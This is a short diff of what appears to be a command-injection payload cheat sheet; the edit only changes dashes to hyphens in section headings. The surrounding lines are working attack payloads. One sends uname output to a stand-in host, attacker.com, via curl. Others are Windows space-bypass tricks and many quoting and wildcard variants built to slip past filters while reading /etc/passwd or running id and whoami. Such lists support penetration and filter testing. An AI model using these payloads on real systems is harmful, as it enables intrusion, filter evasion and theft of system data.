@@ -81,7 +81,7 @@ $(curl attacker.com/$(uname -a|base64))
 ## Space bypass (Windows)
 ;type%PROGRAMFILES:~10,-5%C:\windows\win.ini
 
-## Keyword bypass — cat
+## Keyword bypass - cat
 ;c'a't /etc/passwd
 ;c"a"t /etc/passwd
 ;c\at /etc/passwd
@@ -89,14 +89,14 @@ $(curl attacker.com/$(uname -a|base64))
 ;/bin/c?t /etc/passwd
 ;/bin/ca* /etc/passwd
 
-## Keyword bypass — /etc/passwd
+## Keyword bypass - /etc/passwd
 ;cat /e'tc'/pa'ss'wd
 ;cat /e"tc"/pa"ss"wd
 ;cat /et??as?wd
 ;cat /etc/pass*
 ;cat /etc/p??s?d
 
-## Keyword bypass — id/whoami
+## Keyword bypass - id/whoami
 ;i'd'
 ;w'h'o'a'm'i
 ;/u??/b??/id
